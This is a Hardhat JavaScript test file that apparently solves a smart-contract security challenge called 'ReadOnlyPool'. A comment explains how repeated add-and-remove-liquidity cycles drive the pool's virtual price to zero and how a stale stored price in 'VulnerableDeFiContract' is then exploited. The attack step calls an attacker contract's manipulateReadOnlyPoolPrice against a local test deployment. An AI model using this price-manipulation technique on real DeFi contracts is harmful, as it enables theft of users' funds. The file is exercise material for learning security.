const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

const NAME = "ReadOnlyPool";

describe(NAME, function () {
    async function setup() {
        const [, attackerWallet] = await ethers.getSigners();

        const ReadOnlyFactory = await ethers.getContractFactory(NAME);
        const readOnlyContract = await ReadOnlyFactory.deploy();

        const VulnerableDeFiFactory = await ethers.getContractFactory("VulnerableDeFiContract");
        const vulnerableDeFiContract = await VulnerableDeFiFactory.deploy(readOnlyContract.address);

        await readOnlyContract.addLiquidity({
            value: ethers.utils.parseEther("100"),
        });
        await readOnlyContract.earnProfit({ value: ethers.utils.parseEther("1") });
        await vulnerableDeFiContract.snapshotPrice();

        // you start with 2 ETH
        await network.provider.send("hardhat_setBalance", [
            attackerWallet.address,
            ethers.utils.parseEther("2.0").toHexString(),
        ]);

        return {
            readOnlyContract,
            vulnerableDeFiContract,
            attackerWallet,
        };
    }

    describe("exploit", async function () {
        let readOnlyContract, vulnerableDeFiContract, attackerWallet;
        before(async function () {
            ({ readOnlyContract, vulnerableDeFiContract, attackerWallet } = await loadFixture(setup));
        });

       /**
        * There are two problems.
        * 
        * One weekness is when one call addLiquidity(), the transfered ETH equals the equalivant generated LP amount.  But there are some situations should consider,
        * When one want to redeem the LP, he can get the more eth as he transfered previously after addLiquidity more times . 
        * The details can see the formula: `originalStake[msg.sender] += msg.value;` This desgin can't guarantee (the eth amount in the pool /lp amount) is constant for one user.
        * 
        * So one can repeate the logic: addLiquidity() then removeLiquidity(), as above's explaination the attacker's eth will grow, until the  ReadOnlyPool's eth amount is 
        * less than the totalSupply(). So that as the Math formula `virtualPrice = address(this).balance / totalSupply();` show  the result will equal 0.
        * 
        * Second weekness is  how the  VulnerableDeFiContract get the price, the contract store the price which was called last time instead of  directly calling the ReadOnlyPool.
        * So after manipluating the pool's price, the attack can call the VulnerableDeFiContract's snapshotPrice, which make the price is wrong for the VulnerableDeFiContract.
        * 
        */
        // prettier-ignore
        it("conduct your attack here", async function () {

            const ReadOnlyAttackerFactory = await ethers.getContractFactory("ReadOnlyAttacker");
            const readOnlyAttacker = await ReadOnlyAttackerFactory.deploy();

            await readOnlyAttacker.connect(attackerWallet).manipulateReadOnlyPoolPrice(readOnlyContract.address,{value:ethers.utils.parseEther("1.8")});
            await vulnerableDeFiContract.connect(attackerWallet).snapshotPrice();
    
    });

        after(async function () {
            console.log(await vulnerableDeFiContract.lpTokenPrice());
            expect(await vulnerableDeFiContract.lpTokenPrice()).to.be.equal(0, "snapshotPrice should be zero");
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(
                3,
                "must exploit two transactions or less"
            );
        });
    });
});
